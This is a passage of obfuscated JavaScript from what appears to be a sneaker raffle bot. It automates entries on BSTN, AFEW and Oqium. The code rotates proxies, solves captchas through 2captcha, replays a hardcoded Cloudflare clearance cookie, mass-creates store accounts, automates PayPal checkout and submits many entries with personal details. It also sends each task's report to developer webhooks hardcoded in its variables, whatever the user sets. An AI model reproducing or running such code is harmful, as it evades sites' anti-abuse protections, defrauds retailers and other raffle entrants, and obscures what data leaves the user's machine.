        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x598e14 && (_0x598e14 = {});
    if (_0x3b956a != 'ver') {
        _0x359416(_0x4056cf['name'] + '\x20Task\x20' + (_0x47add4 + 0x1) + '\x20/\x20' + _0x598e14['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847), await _0x44956d(_0x598e14, _0x47add4), _0xe5a6df = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3566aa
                },
                {
                    'name': 'Size',
                    'value': '' + _0x598e14[_0x47add4]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1ca3b9['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x531a7c
                }
            ]
        }], _0x62064e = { 'embeds': _0xe5a6df }, _0x4cd246 = _0x4056cf['data'];
        _0x3b956a == 'exp' ? _0x4cd246['data']['attributes']['email'] = '' + _0x598e14[_0x47add4]['FirstName'] + _0x598e14[_0x47add4]['LastName'] + _0x1ca3b9['catchall'] : _0x4cd246['data']['attributes']['email'] = '' + _0x598e14[_0x47add4]['Email'];
        if (_0x598e14[_0x47add4]['Size'] == 'RANDOM') {
        }
        _0x4cd246['data']['attributes']['properties']['$first_name'] = '' + _0x598e14[_0x47add4]['FirstName'], _0x4cd246['data']['attributes']['properties']['$last_name'] = '' + _0x598e14[_0x47add4]['LastName'], _0x4cd246['data']['attributes']['properties']['$address1'] = _0x598e14[_0x47add4]['Address1'] + '\x20' + _0x598e14[_0x47add4]['Address2'] + '\x20' + _0x598e14[_0x47add4]['HouseNumber'], _0x4cd246['data']['attributes']['properties']['$zip'] = '' + _0x598e14[_0x47add4]['Zip'], _0x4cd246['data']['attributes']['properties']['$city'] = '' + _0x598e14[_0x47add4]['City'], _0x4cd246['data']['attributes']['properties']['$country'] = '' + _0x598e14[_0x47add4]['Country'], _0x4cd246['data']['attributes']['properties']['Size'] = '' + _0x598e14[_0x47add4]['Size'], _0x4cd246['data']['attributes']['properties']['$phone_number'] = '' + _0x598e14[_0x47add4]['Phone'], _0x4cd246['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x598e14[_0x47add4]['Follower'];
    }
    if (_0x1ca3b9['useRandomProxy'] = ![])
        var _0x53d9d2 = _0x4178c5[_0x47add4]['split'](':');
    else
        var _0x42ff4c = Math['round'](Math['random']() * (_0x4178c5['length'] - 0x1)), _0x53d9d2 = _0x4178c5[_0x42ff4c]['split'](':');
    var _0x7978b4 = {
        'jar': _0x2ae84b,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x4056cf['url'],
        'headers': _0x4056cf['headers'],
        'body': JSON['stringify'](_0x4cd246),
        'proxy': 'http://' + _0x53d9d2[0x2] + ':' + _0x53d9d2[0x3] + '@' + _0x53d9d2[0x0] + ':' + _0x53d9d2[0x1]
    };
    return _0x3b956a != 'ver' && (_0x7978b4['url'] = _0x4056cf['url'], _0x7978b4['headers'] = _0x4056cf['headers']), _0x3b956a == 'ver' && (_0x7978b4['method'] = 'GET'), new Promise(function (_0x5dc12a, _0x1fcc3d) {
        callback = async (_0x972eee, _0x5c98b8, _0x120a95) => {
            if (!_0x972eee && _0x5c98b8['statusCode'] == 0xca || !_0x972eee && _0x5c98b8['statusCode'] == 0xc8) {
                if (_0x3b956a != 'ver') {
                    var _0x1fb2ef = await _0x51c110(_0x598e14[_0x47add4], _0x4056cf, 'dev', ![]), _0x442735 = await _0x51c110(_0x598e14[_0x47add4], _0x4056cf, 'pub', ![]);
                    const _0x55b35a = {
                        'succesDEVMSG': { 'embeds': [_0x1fb2ef] },
                        'succesPUBMSG': { 'embeds': [_0x442735] }
                    };
                    if (_0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '')
                        try {
                            await _0x5778ae(_0x1ca3b9['webhook'], _0x55b35a['succesDEVMSG']);
                        } catch {
                        }
                    await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x55b35a['succesDEVMSG']), await _0x30926a(0xc8);
                    try {
                        await _0x5778ae(_0xb27635, _0x55b35a['succesPUBMSG']);
                    } catch {
                    }
                    _0x2989d8(_0x598e14[_0x47add4], _0x4056cf);
                }
                _0x5dc12a(console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x4056cf['name'] + ']\x20Task\x20' + (_0x47add4 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x3b956a != 'ver') {
                    var _0xfc1d67 = '' + _0x972eee, _0xa3e532 = await _0x51c110(_0x598e14[_0x47add4], _0x4056cf, 'dev', !![], _0xfc1d67), _0xd42268 = {};
                    _0xd42268['errorDEV'] = { 'embeds': [_0xa3e532] }, _0x3c82b6(_0x598e14[_0x47add4], _0x4056cf), _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0xd42268['errorDEV']), await _0x5778ae(_0xc30fae, _0xd42268['errorDEV']);
                }
                _0x1fcc3d(console['log'](_0x31f3f5() + '\x20[' + _0x4056cf['name'] + ']\x20Task\x20' + (_0x47add4 + 0x1) + ':\x20' + _0x972eee));
            }
        };
        try {
            _0x3b956a != 'ver' && console['log'](_0x31f3f5() + '\x20[' + _0x4056cf['name'] + ']\x20Task\x20' + (_0x47add4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4cd246['data']['attributes']['email']), _0x30593c(_0x7978b4, callback);
        } catch (_0x364be0) {
            console['log'](_0x31f3f5() + '\x20Task\x20' + (_0x47add4 + 0x1) + ':\x20' + _0x364be0);
        }
    });
}
;
async function _0x14b993(_0x2791e1, _0x52f3b7, _0x20c7cb) {
    var _0x61c45b;
    _0x359416('' + _0x52f3b7);
    var _0x2757c4 = _0x20c7cb[0x0]['split'](':');
    const _0x56181d = await _0x53a2e2['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x2757c4[0x0] + ':' + _0x2757c4[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x31f3f5() + '\x20[' + _0x52f3b7 + ']\x20Getting\x20Session');
        const _0x569225 = await _0x56181d['newPage']();
        await _0x569225['authenticate']({
            'username': '' + _0x2757c4[0x2],
            'password': '' + _0x2757c4[0x3]
        }), await _0x569225['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x569225, await _0x569225['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x31f3f5() + '\x20[' + _0x52f3b7 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x569225['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x31f3f5() + '\x20[' + _0x52f3b7 + ']\x20Successfully\x20logged\x20in'), await _0x30926a(0x2710);
        } catch (_0x203931) {
            throw new Error('Login\x20session\x20expired\x20' + _0x203931);
        }
        for (var _0x212175 = 0x0; _0x212175 < _0x2791e1['length']; _0x212175++) {
            console['log'](_0x31f3f5() + '\x20[' + _0x52f3b7 + ']\x20Task\x20' + (_0x212175 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x359416(_0x52f3b7 + '\x20Task\x20' + (_0x212175 + 0x1) + '\x20/\x20' + _0x2791e1['length']);
            const _0x3a5723 = await _0x56181d['newPage']();
            await _0x3a5723['goto']('' + _0x2791e1[_0x212175], { 'waitUntil': 'networkidle2' }), await _0x30926a(0xbb8);
            try {
                const _0x12b667 = await _0x3a5723['$']('#challenge-heading');
                _0x12b667 && (console['log'](_0x31f3f5() + '\x20[' + _0x52f3b7 + ']\x20Task\x20' + (_0x212175 + 0x1) + '\x20:\x20' + _0x471d3f['yellow']('2FA\x20Required')), await _0x3a5723['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x30926a(0x61a8), await _0x3a5723['waitForSelector']('#payment-submit-btn'), await _0x3a5723['$eval']('#payment-submit-btn', _0x50ae9b => _0x50ae9b['click']()), await _0x3a5723['click']('#payment-submit-btn');
                try {
                    await _0x3a5723['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x30926a(0x5dc), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x52f3b7 + ']\x20Task\x20' + (_0x212175 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x5689cb) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x5689cb['message']);
                } finally {
                    await _0x3a5723['close'](), await _0x30926a(0x4650);
                }
            } catch (_0xf6f39) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x52f3b7 + ']\x20Task\x20' + (_0x212175 + 0x1) + '\x20:\x20' + _0xf6f39));
            }
        }
    } catch (_0x3a5cbd) {
        console['log'](_0x471d3f['red']('' + _0x3a5cbd));
    } finally {
        await _0x56181d['close']();
    }
}
async function _0x1336bb(_0x3e92f6, _0x156af9, _0x1b7a23) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1b806e = 0x0; _0x1b806e < _0x3e92f6['length']; _0x1b806e++) {
        if (_0x54d1c3 != 'yes')
            var _0x54d1c3 = '', _0x1777c0 = 0x0;
        var _0x3883e6;
        await _0x44956d(_0x3e92f6, _0x1b806e), _0x359416(_0x1b7a23['name'] + '\x20Task\x20' + (_0x1b806e + 0x1) + '\x20/\x20' + _0x3e92f6['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847);
        var _0x5175aa = await _0x51c110(_0x3e92f6[_0x1b806e], _0x1b7a23, 'acc', ![]);
        const _0x307439 = { 'succesDEVMSG': { 'embeds': [_0x5175aa] } }, _0x5dcfbe = 'https://www.bstn.com/eu_en/customer/account/create/';
        var _0x260f49 = Math['round'](Math['random']() * (_0x156af9['length'] - 0x1)), _0x285a81 = _0x156af9[_0x260f49]['split'](':');
        const _0x5b2441 = await _0x53a2e2['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x285a81[0x0] + ':' + _0x285a81[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xbaf2e4 = await _0x5b2441['newPage']();
            await _0xbaf2e4['authenticate']({
                'username': '' + _0x285a81[0x2],
                'password': '' + _0x285a81[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x1b7a23['name'] + ']\x20Task\x20' + (_0x1b806e + 0x1) + '\x20:\x20Getting\x20Session'), await _0xbaf2e4['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xbaf2e4['setRequestInterception'](!![]), _0xbaf2e4['on']('request', _0x29dd55 => {
                _0x29dd55['resourceType']() === 'image' ? _0x29dd55['abort']() : _0x29dd55['continue']();
            }), await _0xbaf2e4['goto']('' + _0x5dcfbe), await _0xbaf2e4['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0xbaf2e4['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x31f3f5() + '\x20[' + _0x1b7a23['name'] + ']\x20Task\x20' + (_0x1b806e + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x30926a(0x7d0), console['log'](_0x31f3f5() + '\x20[' + _0x1b7a23['name'] + ']\x20Task\x20' + (_0x1b806e + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x30926a(0x190), await _0xbaf2e4['waitForSelector']('#firstname'), await _0xbaf2e4['type']('#firstname', _0x3e92f6[_0x1b806e]['FirstName'], { 'delay': 0xf0 }), await _0x30926a(0x190), await _0xbaf2e4['type']('#lastname', _0x3e92f6[_0x1b806e]['LastName'], { 'delay': 0xe6 }), await _0x30926a(0x190), await _0xbaf2e4['type']('#email_address', _0x3e92f6[_0x1b806e]['Email'], { 'delay': 0x122 }), await _0x30926a(0x190), await _0xbaf2e4['type']('#password', _0x3e92f6[_0x1b806e]['Password'], { 'delay': 0x82 }), await _0x30926a(0x1f4), await _0xbaf2e4['type']('#password-confirmation', _0x3e92f6[_0x1b806e]['Password'], { 'delay': 0x7c }), console['log'](_0x31f3f5() + '\x20[' + _0x1b7a23['name'] + ']\x20Task\x20' + (_0x1b806e + 0x1) + '\x20:\x20Sending\x20Request'), await _0x30926a(0x2bc), await _0xbaf2e4['$eval']('#form-validate', _0x54899a => _0x54899a['submit']()), await _0x30926a(0x1388);
            const _0x1f38ce = await _0xbaf2e4['$']('#email_address-error');
            if (_0x1f38ce)
                throw new Error('Invalid\x20Email');
            const _0xc42299 = await _0xbaf2e4['$']('#password-error');
            if (_0xc42299)
                throw new Error('Invalid\x20Password');
            await _0xbaf2e4['waitForSelector']('div.mesg-success'), _0x54d1c3 = 'no', console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x1b7a23['name'] + ']\x20Task\x20' + (_0x1b806e + 0x1) + '\x20:\x20Account\x20' + _0x3e92f6[_0x1b806e]['Email'] + '\x20Generated')), _0x1c44db['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x3e92f6[_0x1b806e]['Email'] + ',' + _0x3e92f6[_0x1b806e]['Password']);
            try {
                _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x307439['succesDEVMSG']);
            } catch {
            }
            await _0x5778ae(_0x5cef85, _0x307439['succesDEVMSG']), console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x1b7a23['name'] + ']\x20Task\x20' + (_0x1b806e + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0x243f45) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1b7a23['name'] + ']\x20Task\x20' + (_0x1b806e + 0x1) + '\x20:\x20' + _0x243f45)), _0x3883e6 = '' + _0x243f45;
            var _0xb0af7 = await _0x51c110(_0x3e92f6[_0x1b806e], _0x1b7a23, 'acc', !![], _0x3883e6);
            _0x307439['errorDEV'] = { 'embeds': [_0xb0af7] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x307439['errorDEV']), await _0x5778ae(_0xc30fae, _0x307439['errorDEV']), _0x54d1c3 = 'yes';
        } finally {
            _0x5b2441['close']();
            if (_0x54d1c3 == 'yes' && _0x1777c0 != 0x5) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1b7a23['name'] + ']\x20Task\x20' + (_0x1b806e + 0x1) + '\x20:\x20Retrying')), _0x1b806e = _0x1b806e - 0x1, _0x1777c0 = _0x1777c0 + 0x1;
                continue;
            }
            _0x54d1c3 == 'yes' && _0x1777c0 >= 0x5 && (_0x3c82b6(_0x3e92f6[_0x1b806e], _0x1b7a23), _0x54d1c3 = 'no', _0x1777c0 = 0x0), console['log'](_0x31f3f5() + '\x20[' + _0x1b7a23['name'] + ']\x20Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x100403(_0x404ab7, _0x3732d2, _0x1b6fcf) {
    _0x53a2e2['use'](_0x572d68());
    for (var _0x2a7a35 = 0x0; _0x2a7a35 < _0x404ab7['length']; _0x2a7a35++) {
        if (_0x212990 != 'yes')
            var _0x212990 = '', _0x5343c7 = 0x0;
        var _0x3a1863 = Math['round'](Math['random']() * (_0x3732d2['length'] - 0x1)), _0x4ab64f = _0x3732d2[_0x3a1863]['split'](':');
        const _0x4ef003 = await _0x53a2e2['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4ab64f[0x0] + ':' + _0x4ab64f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x500544 = await _0x4ef003['newPage']();
            await _0x500544['authenticate']({
                'username': '' + _0x4ab64f[0x2],
                'password': '' + _0x4ab64f[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x1b6fcf['name'] + ']\x20Task\x20' + (_0x2a7a35 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x500544['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x500544['setRequestInterception'](!![]), _0x500544['on']('request', _0x8d03b9 => {
                _0x8d03b9['resourceType']() === 'image' || _0x8d03b9['resourceType']() === 'font' || _0x8d03b9['resourceType']() === 'media' ? _0x8d03b9['abort']() : _0x8d03b9['continue']();
            }), console['log'](_0x31f3f5() + '\x20[' + _0x1b6fcf['name'] + ']\x20Task\x20' + (_0x2a7a35 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x500544['goto'](_0x404ab7[_0x2a7a35]), console['log'](_0x31f3f5() + '\x20[' + _0x1b6fcf['name'] + ']\x20Task\x20' + (_0x2a7a35 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x500544['waitForTimeout'](0xbb8);
            try {
                await _0x500544['waitForSelector']('.dashboard-main_title'), _0x212990 = 'no', console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x1b6fcf['name'] + ']\x20Task\x20' + (_0x2a7a35 + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x3799ea = await _0x51c110(null, _0x1b6fcf, 'ver', ![]);
                const _0x486eab = { 'succesDEVMSG': { 'embeds': [_0x3799ea] } };
                await _0x5778ae(_0x2b3e0d, _0x486eab['succesDEVMSG']);
            } catch (_0x96446) {
                throw new Error(_0x96446);
            }
        } catch (_0x5283e5) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1b6fcf['name'] + ']\x20Task\x20' + (_0x2a7a35 + 0x1) + '\x20:\x20' + _0x5283e5));
            var _0x2ea088 = _0x5283e5, _0x153d59 = await _0x51c110(null, _0x1b6fcf, 'ver', !![], _0x2ea088);
            const _0x1b0388 = { 'errorDEVMSG': { 'embeds': [_0x153d59] } };
            _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x1b0388['errorDEVMSG']), await _0x5778ae(_0xc30fae, _0x1b0388['errorDEVMSG']), _0x212990 = 'yes';
        } finally {
            _0x4ef003['close']();
            if (_0x212990 == 'yes' && _0x5343c7 != 0x5) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1b6fcf['name'] + ']\x20Task\x20' + (_0x2a7a35 + 0x1) + '\x20:\x20Retrying')), _0x2a7a35 = _0x2a7a35 - 0x1, _0x5343c7 = _0x5343c7 + 0x1;
                continue;
            }
            _0x212990 == 'yes' && _0x5343c7 >= 0x5 && (_0x3c82b6(bstn[_0x2a7a35], _0x1b6fcf), _0x212990 = 'no', _0x5343c7 = 0x0), console['log'](_0x31f3f5() + '\x20[' + _0x1b6fcf['name'] + ']\x20Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x54d971(_0x918d87, _0x28c567, _0x309ac0) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4ad3de = 0x0; _0x4ad3de < _0x918d87['length']; _0x4ad3de++) {
        var _0x508ba3;
        await _0x44956d(_0x918d87, _0x4ad3de);
        if (_0x3cab5a != 'yes')
            var _0x3cab5a = '', _0x1077a3 = 0x0;
        _0x359416(_0x309ac0['name'] + '\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20/\x20' + _0x918d87['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847);
        var _0x4d3efd = Math['round'](Math['random']() * (_0x28c567['length'] - 0x1)), _0x503981 = _0x28c567[_0x4d3efd]['split'](':'), _0x4f7a1f;
        try {
            _0x4f7a1f = await _0x53a2e2['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x503981[0x0] + ':' + _0x503981[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x4f7a1f = await _0x53a2e2['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x503981[0x0] + ':' + _0x503981[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x2acfe2 = await _0x4f7a1f['newPage'](), _0x27efc2 = await _0x2acfe2['target']()['createCDPSession'](), { windowId: _0xe35483 } = await _0x27efc2['send']('Browser.getWindowForTarget');
            await _0x2acfe2['setViewport']({
                'width': 0x501,
                'height': 0x2d0
            });
            var _0x732ed2 = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x2acfe2['authenticate']({
                'username': '' + _0x503981[0x2],
                'password': '' + _0x503981[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2acfe2['goto']('' + _0x918d87[_0x4ad3de]['Url']), console['log'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x2acfe2['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x27efc2['send']('Browser.setWindowBounds', {
                'windowId': _0xe35483,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x30926a(0x1388), await _0x2acfe2['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2acfe2['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x30926a(0x1f4), console['log'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Logging\x20in'), await _0x2acfe2['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x1d4e1e => _0x1d4e1e['click']()), await _0x2acfe2['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2acfe2['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x30926a(0x7d0), await _0x2acfe2['waitForSelector']('#email-login'), await _0x2acfe2['type']('#email-login', '' + _0x918d87[_0x4ad3de]['Email']), await _0x30926a(0xdac), await _0x2acfe2['waitForSelector']('#password'), await _0x2acfe2['type']('#password', '' + _0x918d87[_0x4ad3de]['Password'], { 'delay': 0xe6 }), await _0x30926a(0x5dc);
            try {
                await _0x2acfe2['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0xa6012d => _0xa6012d['click']());
            } catch {
            }
            try {
                await _0x2acfe2['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x5c42eb) {
            }
            await _0x30926a(0x3e8);
            const _0x4b40ed = await _0x2acfe2['$']('.enteredDraw_container__2KmQ_');
            if (_0x4b40ed)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x918d87[_0x4ad3de]['Size']);
            if (_0x918d87[_0x4ad3de]['Size'] != 'RANDOM') {
                var _0x5ee4c3 = _0x918d87[_0x4ad3de]['Size']['replace']('.', ',');
                const _0x14cd39 = await _0x2acfe2['$x']('//div[contains(text(),\x20' + _0x5ee4c3 + ')]');
                await _0x14cd39[0x0]['click']();
            } else {
                const _0x31268f = await _0x2acfe2['$$']('div.swatchTile_tile__IRH9Q');
                var _0x4a2d2b = Math['round'](Math['random']() * (_0x31268f['length'] - 0x1));
                await _0x31268f[_0x4a2d2b]['click']();
            }
            await _0x30926a(0x1f4);
            const _0x4be67c = await _0x2acfe2['$']('.addressList_addressItem__LE2PB');
            if (_0x4be67c && _0x918d87[_0x4ad3de]['Mode'] != 'NEW') {
            } else
                console['log'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Filling\x20Address'), await _0x2acfe2['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x30926a(0x5dc), await _0x2acfe2['waitForSelector']('#firstname'), await _0x2acfe2['type']('#firstname', '' + _0x918d87[_0x4ad3de]['FirstName']), await _0x30926a(0x1f4), await _0x2acfe2['waitForSelector']('#firstname'), await _0x2acfe2['type']('#lastname', '' + _0x918d87[_0x4ad3de]['LastName']), await _0x30926a(0x1f4), await _0x2acfe2['waitForSelector']('#firstname'), await _0x2acfe2['type']('#street', '' + _0x918d87[_0x4ad3de]['Address1']), await _0x30926a(0x1f4), await _0x2acfe2['waitForSelector']('#firstname'), await _0x2acfe2['type']('#houseNumber', _0x918d87[_0x4ad3de]['HouseNumber'] + '\x20' + _0x918d87[_0x4ad3de]['Address2']), await _0x30926a(0x1f4), await _0x2acfe2['waitForSelector']('#firstname'), await _0x2acfe2['select']('#country_code', '' + _0x918d87[_0x4ad3de]['Country']), await _0x30926a(0x1f4), await _0x2acfe2['type']('#postcode', '' + _0x918d87[_0x4ad3de]['Zip']), await _0x30926a(0x1f4), await _0x2acfe2['type']('#city', '' + _0x918d87[_0x4ad3de]['City']), await _0x30926a(0x1f4), await _0x2acfe2['type']('#telephone', '' + _0x918d87[_0x4ad3de]['Phone']), await _0x30926a(0x1f4), await _0x2acfe2['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x30926a(0x9c4);
            try {
                await _0x2acfe2['type']('#instagram_name', '' + _0x918d87[_0x4ad3de]['Follower']), await _0x2acfe2['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            console['log'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x30926a(0x5dc);
            try {
                await _0x2acfe2['click']('.checkBox_boxHolder__wLGVe');
            } catch {
            }
            await _0x30926a(0x5dc), await _0x2acfe2['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x39bf9a => _0x39bf9a['click']()), await _0x30926a(0x1388);
            try {
                await _0x2acfe2['waitForSelector']('.success_msg__2HjJY');
            } catch {
                await _0x2acfe2['reload']({ 'waitUntil': 'networkidle2' });
                if (_0x918d87[_0x4ad3de]['Size'] != 'RANDOM') {
                    var _0x5ee4c3 = _0x918d87[_0x4ad3de]['Size']['replace']('.', ',');
                    const _0x404a03 = await _0x2acfe2['$x']('//div[contains(text(),\x20' + _0x5ee4c3 + ')]');
                    await _0x404a03[0x0]['click']();
                } else {
                    const _0xc381bc = await _0x2acfe2['$$']('div.swatchTile_tile__IRH9Q');
                    var _0x4a2d2b = Math['round'](Math['random']() * (_0xc381bc['length'] - 0x1));
                    await _0xc381bc[_0x4a2d2b]['click']();
                }
                await _0x30926a(0x5dc);
                try {
                    await _0x2acfe2['hover']('#instagram_name'), await _0x2acfe2['type']('#instagram_name', '' + _0x918d87[_0x4ad3de]['Follower']), await _0x2acfe2['click']('.note_groupBtn__WLDwH\x20>\x20button');
                } catch {
                }
                console['log'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Retrying'), await _0x2acfe2['hover']('.checkBox_boxHolder__wLGVe'), await _0x30926a(0x5dc), await _0x2acfe2['click']('.checkBox_boxHolder__wLGVe'), await _0x30926a(0x157c), await _0x2acfe2['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3709fc => _0x3709fc['click']()), await _0x30926a(0x1388), await _0x2acfe2['waitForSelector']('.success_msg__2HjJY');
            }
            _0x3cab5a = 'no', _0x2989d8(_0x918d87[_0x4ad3de], _0x309ac0), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x309ac0['name'] + ']\x20Task\x20' + (_0x4ad3de + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x6859a8 = await _0x51c110(_0x918d87[_0x4ad3de], _0x309ac0, 'dev', ![]), _0x1102ce = await _0x51c110(_0x918d87[_0x4ad3de], _0x309ac0, 'pub', ![]);
            const _0x21fc7b = {
